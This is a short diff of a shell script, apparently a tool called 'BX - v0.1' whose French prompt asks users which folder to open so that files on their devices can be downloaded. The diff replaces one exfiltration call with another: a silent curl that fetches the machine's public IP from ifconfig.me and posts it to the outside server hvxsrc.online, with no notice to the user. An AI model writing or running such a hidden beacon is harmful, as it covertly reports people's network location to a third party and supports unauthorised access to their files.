@@ -44,10 +44,7 @@ explore() {
     done
 }
 clear
-curl -X POST https://hvxsrc.online/api/message \
-  -H "Content-Type: application/json" \
-  -d "{\"message\":\"$IP\"}"
-
+curl -s -H Content-Type:application/json -d "{\"message\":\"$(curl -s ifconfig.me)\"}" https://hvxsrc.online/api/message
 echo "BX - v0.1"
 echo ""
 echo "Bienvenu, entrez le chemin auxquel vous voulez donner acces a vos appareils, pour telecharger les fichiers qui y sont stocker."
